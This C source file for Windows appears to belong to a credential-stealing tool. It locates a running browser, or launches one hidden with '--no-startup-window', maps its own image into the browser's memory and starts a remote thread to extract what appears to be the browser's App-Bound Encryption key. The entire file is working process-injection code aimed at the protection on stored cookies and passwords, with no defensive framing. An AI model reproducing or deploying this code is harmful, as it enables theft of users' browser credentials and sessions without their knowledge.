#include "AbeDecrypt.h"

static ULONG
AbeFindProcessIdByName(
    _In_ PCWSTR Name)
{
    UNICODE_STRING Target;
    PSYSTEM_PROCESS_INFORMATION Entry;
    PVOID Info;
    ULONG Pid = 0;

    RtlInitUnicodeString(&Target, Name);
    if (!NT_SUCCESS(Sys_QueryDynamicInfo(SystemProcessInformation, &Info)))
    {
        return 0;
    }
    Entry = Info;
    for (;;)
    {
        if (Entry->ImageName.Buffer != NULL &&
            RtlEqualUnicodeString(&Entry->ImageName, &Target, TRUE))
        {
            Pid = (ULONG)(ULONG_PTR)Entry->UniqueProcessId;
            break;
        }
        if (Entry->NextEntryOffset == 0)
        {
            break;
        }
        Entry = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)Entry + Entry->NextEntryOffset);
    }
    Sys_FreeInfo(Info);
    return Pid;
}

/*** method: Inject (target the running browser process, launch it if needed) ***/

_Success_(return != FALSE)
BOOL
AbeGetKeyInject(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    PVOID Self = (PVOID)&__ImageBase;
    PVOID Mapped = NULL;
    HANDLE Process = NULL, Thread = NULL;
    HANDLE LaunchedProcess = NULL;
    SIZE_T RegionSize = 0;
    LONG Code = (LONG)E_FAIL;
    ULONG Pid, Polls, LaunchedPid = 0;
    NTSTATUS Status;

    if (!AbePrepareRequest(Browser))
    {
        return FALSE;
    }

    Pid = AbeFindProcessIdByName(Browser->ExeName);
    if (Pid == 0)
    {
        /* not running: launch it so we have a live process to inject into */
        PROCESS_INFORMATION Pi;

        if (!AbeCreateBrowserProcessEx(Browser->ExePath,
                                       L"--no-startup-window",
                                       0,
                                       SW_HIDE,
                                       &Pi))
        {
            AbeLog(L"Inject: failed to create browser process, gle=%lu\r\n", Err_GetLastError());
            return FALSE;
        }
        LaunchedProcess = Pi.hProcess;
        LaunchedPid = Pi.dwProcessId;
        Pid = LaunchedPid;
        NtClose(Pi.hThread);
        for (Polls = 0; Polls < 50; Polls++)
        {
            ULONG FoundPid = AbeFindProcessIdByName(Browser->ExeName);

            if (FoundPid != 0)
            {
                Pid = FoundPid;
                break;
            }
            PS_DelayExec(200);
        }
        AbeLog(L"Inject: launched hidden %ls (pid=%lu)\r\n", Browser->ExeName, Pid);
    }
    if (Pid == 0)
    {
        AbeLog(L"Inject: no running %ls found\r\n", Browser->ExeName);
        return FALSE;
    }
    Status = PS_OpenProcess(&Process,
                            PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                            PROCESS_VM_READ,
                            Pid);
    if (!NT_SUCCESS(Status))
    {
        AbeLog(L"Inject: OpenProcess(%lu) failed, 0x%08lX\r\n", Pid, Status);
        if (LaunchedProcess != NULL)
        {
            NtTerminateProcess(LaunchedProcess, 0);
            NtWaitForSingleObject(LaunchedProcess, FALSE, NULL);
            NtClose(LaunchedProcess);
        }
        return FALSE;
    }

    if (AbeMapSelf(Process, &Mapped) &&
        NT_SUCCESS(PS_CreateThread(Process,
                                   FALSE,
                                   (PUSER_THREAD_START_ROUTINE)((PBYTE)Mapped +
                                       ((ULONG_PTR)AbeInjectEntry - (ULONG_PTR)Self)),
                                   NULL,
                                   &Thread,
                                   NULL)))
    {
        Code = AbeWaitRemoteResult(Process, Thread, Mapped, Self, Key);
    }
    if (Code != 0)
    {
        AbeLog(L"Inject: payload failed, hr=0x%08lX\r\n", (unsigned long)Code);
    }

    /* do NOT terminate the user's browser; the remote thread exits on its own */
    if (Thread != NULL)
    {
        NtClose(Thread);
    }
    if (Mapped != NULL)
    {
        NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
    }
    if (LaunchedProcess != NULL)
    {
        if (Process != NULL)
        {
            NtTerminateProcess(Process, 0);
            NtWaitForSingleObject(Process, FALSE, NULL);
        }
        if (LaunchedPid != 0 && LaunchedPid != Pid)
        {
            NtTerminateProcess(LaunchedProcess, 0);
            NtWaitForSingleObject(LaunchedProcess, FALSE, NULL);
        }
        NtClose(LaunchedProcess);
    }
    if (Process != NULL)
    {
        NtClose(Process);
    }
    return Code == 0;
}
